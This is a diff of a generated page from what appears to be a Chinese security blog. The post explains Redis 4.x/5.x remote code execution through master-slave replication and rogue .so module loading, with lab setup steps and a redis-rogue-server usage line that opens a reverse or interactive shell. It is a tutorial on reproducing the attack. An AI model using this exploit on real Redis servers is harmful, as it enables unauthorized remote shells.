@@ -296,22 +296,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="redis4-x-5-x-RCE"><a href="#redis4-x-5-x-RCE" class="headerlink" title="redis4.x/5.x RCE"></a>redis4.x/5.x RCE</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>4.x-5.x</p>
-<h4 id="主从模式"><a href="#主从模式" class="headerlink" title="主从模式"></a>主从模式</h4><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
-<h4 id="redis模块"><a href="#redis模块" class="headerlink" title="redis模块"></a>redis模块</h4><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
-<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 下载redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 更改配置文件</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes 改为protected-mode no</span><br><span class="line">      bind 127.0.0.1 改为 bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># 启动redis</span><br><span class="line">cd src</span><br><span class="line">./redis-server ../redis.conf   # 加载指定配置</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp下载 <code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
+        <h3 id="redis4.x5.x-rce">redis4.x/5.x RCE</h3>
+<h4 id="影响版本">影响版本</h4>
+<p>4.x-5.x</p>
+<h4 id="主从模式">主从模式</h4>
+<p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<h4 id="redis模块">redis模块</h4>
+<p>在Reids
+4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
+<h4 id="利用原理">利用原理</h4>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 下载redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 更改配置文件</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes 改为protected-mode no</span><br><span class="line">      bind 127.0.0.1 改为 bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># 启动redis</span><br><span class="line">cd src</span><br><span class="line">./redis-server ../redis.conf   # 加载指定配置</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p>exp下载
+<code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
 <p>用法:<code>python3 redis-rogue-server.py --rhost=192.168.0.182 --lhost=192.168.0.128 --exp=exp.so</code></p>
-<p>-r 反弹shell  -i 实时shell</p>
+<p>-r 反弹shell -i 实时shell</p>
 <p><img src="/posts/27814dfe/exp_i.png"></p>
 <p><img src="/posts/27814dfe/exp.png"></p>
 <p><img src="/posts/27814dfe/shell.png"></p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.feidao.site/wordpress/?p=2090">http://www.feidao.site/wordpress/?p=2090</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43252204/article/details/115181128">https://blog.csdn.net/weixin_43252204/article/details/115181128</a></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>https://paper.seebug.org/975/</p>
+<p>http://www.feidao.site/wordpress/?p=2090</p>
+<p>https://blog.csdn.net/weixin_43252204/article/details/115181128</p>
 </blockquote>
 
     </div>
@@ -442,7 +451,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#redis4-x-5-x-RCE"><span class="nav-number">1.</span> <span class="nav-text">redis4.x&#x2F;5.x RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">主从模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#redis%E6%A8%A1%E5%9D%97"><span class="nav-number">1.3.</span> <span class="nav-text">redis模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.</span> <span class="nav-text">利用原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#redis4.x5.x-rce"><span class="nav-number">1.</span> <span class="nav-text">redis4.x&#x2F;5.x RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">主从模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#redis%E6%A8%A1%E5%9D%97"><span class="nav-number">1.3.</span> <span class="nav-text">redis模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.</span> <span class="nav-text">利用原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -458,7 +467,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -506,7 +515,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -520,7 +529,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -531,7 +540,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -671,6 +680,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
